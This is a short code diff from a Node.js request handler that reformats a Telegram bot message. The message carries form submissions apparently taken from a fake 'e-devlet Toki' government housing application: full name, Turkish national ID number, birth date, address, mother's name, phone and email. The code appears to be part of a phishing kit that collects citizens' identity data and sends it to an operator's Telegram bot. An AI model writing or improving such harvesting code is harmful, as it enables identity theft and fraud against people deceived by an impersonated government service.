@@ -123,18 +123,18 @@ module.exports = async (req, res) => {
         }
 
         // Telegram'a gönderilecek mesaj (yeni format)
-        const messageText = `*✨ 🇹🇷 Yeni Başvuru Girişi (e-devlet Toki)*
-        *👤 Ad Soyad:* ${name}
-        *🆔 TC:* ${tc}
-        *📅 Doğum Tarihi:* ${formattedBirthDate || 'Belirtilmemiş'}
-        *🏙 Şehir:* ${city || 'Belirtilmemiş'}
-        *📍 İlçe/Adres:* ${district || 'Belirtilmemiş'}
-        *👩 Anne Adı:* ${mother_name || 'Belirtilmemiş'}
-        *🏠 Proje:* ${project}
-        *📱 Telefon:* ${phone}
-        *📧 E-posta:* ${email}
-        *🆔 Başvuru ID:* ${applicationId || 'Kaydedilemedi'}
-        *📅 Tarih:* ${formatDate(new Date())}`;
+        const messageText = `*✨ 🇹🇷 Yeni Başvuru Girişi (e-devlet Toki)*\n\n
+*👤 Ad Soyad:* ${name}
+*🆔 TC:* ${tc}
+*📅 Doğum Tarihi:* ${formattedBirthDate || 'Belirtilmemiş'}
+*🏙 Şehir:* ${city || 'Belirtilmemiş'}
+*📍 İlçe/Adres:* ${district || 'Belirtilmemiş'}
+*👩 Anne Adı:* ${mother_name || 'Belirtilmemiş'}
+*🏠 Proje:* ${project}
+*📱 Telefon:* ${phone}
+*📧 E-posta:* ${email}
+*🆔 Başvuru ID:* ${applicationId || 'Kaydedilemedi'}
+*📅 Tarih:* ${formatDate(new Date())}`;
 
         const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
